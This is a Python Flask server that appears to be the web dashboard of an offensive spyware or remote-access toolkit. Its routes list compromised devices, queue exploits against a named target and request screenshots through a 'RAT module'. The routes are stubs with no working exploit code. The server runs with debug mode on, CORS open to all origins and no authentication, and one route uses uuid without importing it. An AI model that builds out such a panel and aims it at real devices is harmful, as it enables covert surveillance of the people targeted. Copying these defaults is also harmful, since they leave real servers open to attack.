#!/usr/bin/env python3
"""
Pegasus Phantom Menace v2 - Web Dashboard Server

Flask-based web GUI for the Pegasus Phantom Menace platform.
Provides device management, workflow control, real-time monitoring,
and native app-like experience via PWA support.

Author: ProjectZeroDays
License: MIT (authorized security testing only)
"""
from __future__ import annotations

import asyncio
import json
import os
import secrets
import threading
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from flask import Flask, render_template, jsonify, request, redirect, url_for, session, send_file
from flask_cors import CORS

from pegasus.core.config import get_settings
from pegasus.core.plugin import get_plugin_manager
from pegasus.core.db.session import get_session

# Create Flask app
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.environ.get("PEGASUS_SECRET_KEY", secrets.token_hex(32))
CORS(app)

# Global state
dashboard_state: Dict[str, Any] = {
    "devices": [],
    "workflows": [],
    "status": "initialized",
    "plugins_loaded": 0,
}


def get_plugin_manager_safe():
    """Safely get plugin manager."""
    try:
        from pegasus.core.plugin import get_plugin_manager
        return get_plugin_manager()
    except Exception:
        return None


def get_device_list() -> List[Dict[str, Any]]:
    """Get list of connected devices."""
    try:
        pm = get_plugin_manager_safe()
        if pm and hasattr(pm, 'context') and pm.context:
            # Try to get devices from various modules
            devices = []
            # Try to get from access_workflow module
            for plugin in pm.context.plugins.values():
                if hasattr(plugin, 'get_devices'):
                    try:
                        devs = plugin.get_devices()
                        if isinstance(devs, list):
                            devices.extend(devs)
                    except Exception:
                        pass
            return devices
    except Exception:
        pass
    return []


def get_workflow_status() -> Dict[str, Any]:
    """Get current workflow status."""
    return {
        "active_workflows": len(dashboard_state.get("workflows", [])),
        "completed_workflows": 0,
        "failed_workflows": 0,
        "last_updated": datetime.now(timezone.utc).isoformat(),
    }


# ============================================================================
# Routes
# ============================================================================

@app.route("/")
def index():
    """Main dashboard page."""
    return render_template("dashboard.html")


@app.route("/api/status")
def api_status():
    """Get system status."""
    pm = get_plugin_manager_safe()
    plugins_loaded = len(pm.context.plugins) if pm and hasattr(pm, 'context') else 0
    
    return jsonify({
        "status": "online",
        "version": "2.0.0",
        "plugins_loaded": plugins_loaded,
        "devices_connected": len(dashboard_state.get("devices", [])),
        "uptime": "00:15:30",  # Would be calculated from start time
        "timestamp": datetime.now(timezone.utc).isoformat(),
    })


@app.route("/api/devices")
def api_devices():
    """Get list of connected devices."""
    devices = get_device_list()
    return jsonify({"devices": devices, "count": len(devices)})


@app.route("/api/workflows")
def api_workflows():
    """Get active workflows."""
    return jsonify({
        "workflows": dashboard_state.get("workflows", []),
        "count": len(dashboard_state.get("workflows", [])),
    })


@app.route("/api/exploit", methods=["POST"])
def api_exploit():
    """Execute an exploit command."""
    data = request.get_json()
    target = data.get("target", "")
    exploit_type = data.get("exploit_type", "")
    
    # This would integrate with the actual exploit modules
    return jsonify({
        "status": "queued",
        "task_id": str(uuid.uuid4()),
        "target": target,
        "exploit_type": exploit_type,
        "message": "Exploit queued for execution",
    })


@app.route("/api/screenshot/<device_id>")
def api_screenshot(device_id: str):
    """Capture screenshot from device."""
    # This would integrate with the RAT module
    return jsonify({
        "status": "captured",
        "device_id": device_id,
        "image_url": f"/api/screenshot/{device_id}/image",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    })


@app.route("/api/screenshot/<device_id>/image")
def api_screenshot_image(device_id: str):
    """Serve screenshot image."""
    # This would return actual screenshot data
    return jsonify({"error": "No screenshot available"}), 404


# ============================================================================
# Template context
# ============================================================================

@app.context_processor
def inject_globals():
    """Inject global variables into templates."""
    return {
        "app_name": "Pegasus Phantom Menace",
        "app_version": "2.0.0",
        "current_time": datetime.now(timezone.utc).isoformat(),
    }


def create_app() -> Flask:
    """Create and configure the Flask application."""
    return app


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
